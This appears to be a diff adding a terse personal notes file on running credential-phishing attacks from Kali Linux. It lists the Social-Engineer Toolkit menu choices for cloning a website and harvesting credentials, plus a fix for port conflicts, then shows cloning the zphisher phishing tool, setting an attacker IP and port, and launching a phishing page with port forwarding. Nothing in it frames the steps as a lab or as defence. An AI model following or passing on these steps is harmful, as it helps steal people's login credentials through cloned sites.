@@ -1,0 +1,48 @@
+On kali
+
+sudo setoolkit
+
+click - 1		# 1) Social-Engineering Attacks
+
+click  - 2		# 2) Website Attack Vectors
+
+click  - 3 		#   3) Credential Harvester Attack Method
+
+click -  2		#  2) site clone
+
+
+give your <ip>
+
+give url for clone
+
+browser <ip>
+
+
+if error occur due to port
+lsof -i :80
+sudo kill -9 pid
+
+then again perform steps
+
+
+
+git clone https://github.com/htr-tech/zphisher.git
+
+cd zphisher
+vim zphisher.sh
+
+HOST='<Attacker-IP>'
+PORT='80'
+:wq
+
+Bash zphisher.sh
+
+# for example
+select an options: 05	
+select port forwarding: 01
+custom port: <port>
+
+
+browser  <ip>:<port>	
+
+
